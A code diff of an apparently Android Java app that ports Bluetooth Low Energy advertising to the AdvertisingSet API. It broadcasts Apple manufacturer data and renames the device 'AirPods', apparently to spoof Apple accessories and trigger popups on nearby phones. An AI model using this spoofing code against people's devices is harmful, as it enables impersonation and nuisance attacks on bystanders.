-                .setConnectable( false )
-                .setTimeout(advTimeout)
+    public void startAdv(byte[] data) {
+        AdvertisingSetParameters parameters = new AdvertisingSetParameters.Builder()
+                .setLegacyMode(true)
+                .setConnectable(false)
+                .setInterval(interval)
+                .setTxPowerLevel(txPowerLevel)
                 .build();
         AdvertiseData Data = new AdvertiseData.Builder()
                 .setIncludeDeviceName(false)
                 .setIncludeTxPowerLevel(false)
-                .addManufacturerData(0x004c,data)
+                .addManufacturerData(0x004c, data)
                 .build();
         AdvertiseData scanData = new AdvertiseData.Builder()
                 .setIncludeTxPowerLevel(true)
                 .setIncludeDeviceName(true)
                 .build();
-        AdvertiseCallback advertisingCallback = new AdvertiseCallback() {
+        AdvertisingSetCallback advertisingCallback = new AdvertisingSetCallback() {
             @Override
-            public void onStartSuccess(AdvertiseSettings settingsInEffect) {
-                super.onStartSuccess(settingsInEffect);
-                Log.i( "BLE", "Advertising State: " + settingsInEffect );
+            public void onAdvertisingSetStarted(AdvertisingSet advertisingSet, int txPower, int status) {
+                Log.i("BLE", "onAdvertisingSetStarted(): txPower:" + txPower + " , status: "
+                        + status);
+                currentAdvertisingSet = advertisingSet;
             }
+
             @Override
-            public void onStartFailure(int errorCode) {
-                super.onStartFailure(errorCode);
-                Log.e( "BLE", "Advertising onStartFailure: " + errorCode );
+            public void onAdvertisingDataSet(AdvertisingSet advertisingSet, int status) {
+                Log.i("BLE", "onAdvertisingDataSet() :status:" + status);
+            }
+
+            @Override
+            public void onScanResponseDataSet(AdvertisingSet advertisingSet, int status) {
+                Log.i("BLE", "onScanResponseDataSet(): status:" + status);
+            }
+
+            @Override
+            public void onAdvertisingSetStopped(AdvertisingSet advertisingSet) {
+                Log.i("BLE", "onAdvertisingSetStopped():");
             }
         };
         if (bluePermission()) {
-            Log.d("BLE","Advertising Successful!");
+            Log.d("BLE", "Advertising Successful!");
             bluetoothAdapter.setName("AirPods");
-            bluetoothLeAdvertiser.startAdvertising(settings, Data, scanData, advertisingCallback);
+            bluetoothLeAdvertiser.startAdvertisingSet(parameters, Data, scanData, null, null, advertisingCallback);
         } else {
-            Log.e("BLE","Advertising Failed! Need Permission.");
-            Toast.makeText(this, "程序需要获取权限！", Toast.LENGTH_SHORT).show();
+            Log.e("BLE", "Advertising Failed! Need Permission.");
+            Toast.makeText(this, "程序需要获取权限！错误代码：02", Toast.LENGTH_SHORT).show();
         }
     }
 }
